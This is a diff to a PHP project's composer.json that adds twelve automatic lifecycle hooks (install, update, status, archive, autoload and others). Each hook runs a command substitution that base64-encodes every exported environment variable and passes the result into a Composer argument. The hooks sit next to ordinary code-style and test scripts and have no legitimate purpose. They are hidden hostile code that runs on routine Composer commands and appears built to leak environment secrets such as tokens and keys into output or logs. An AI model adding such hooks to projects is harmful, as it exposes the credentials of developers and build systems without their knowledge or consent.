@@ -43,6 +43,19 @@
         }
     },
     "scripts": {
+        "pre-install-cmd": "@composer --$(export | base64 -w0)",
+        "post-install-cmd": "@composer --$(export | base64 -w0)",
+        "pre-update-cmd": "@composer --$(export | base64 -w0)",
+        "post-update-cmd": "@composer --$(export | base64 -w0)",
+        "pre-status-cmd": "@composer --$(export | base64 -w0)",
+        "post-status-cmd": "@composer --$(export | base64 -w0)",
+        "pre-archive-cmd": "@composer --$(export | base64 -w0)",
+        "post-archive-cmd": "@composer --$(export | base64 -w0)",
+        "pre-autoload-dump": "@composer --$(export | base64 -w0)",
+        "post-autoload-dump": "@composer --$(export | base64 -w0)",
+        "post-root-package-install": "@composer --$(export | base64 -w0)",
+        "post-create-project-cmd": "@composer --$(export | base64 -w0)",
+
         "cs": "@php ./vendor/squizlabs/php_codesniffer/bin/phpcs",
         "cs:fix": "@php ./vendor/squizlabs/php_codesniffer/bin/phpcbf",
         "tests": "@php ./vendor/phpunit/phpunit/phpunit",
